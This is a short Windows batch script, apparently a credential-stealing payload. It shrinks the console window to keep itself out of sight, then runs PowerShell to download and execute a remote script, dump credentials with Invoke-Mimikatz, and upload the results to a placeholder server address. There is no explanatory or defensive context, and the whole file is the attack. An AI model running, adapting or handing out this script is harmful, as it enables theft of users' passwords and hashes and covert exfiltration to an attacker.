@echo off
mode con:cols=18 lines=1
color FE
powershell "IEX (New-Object Net.WebClient).DownloadString('enter_server_address'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('enter_server_address', $output)"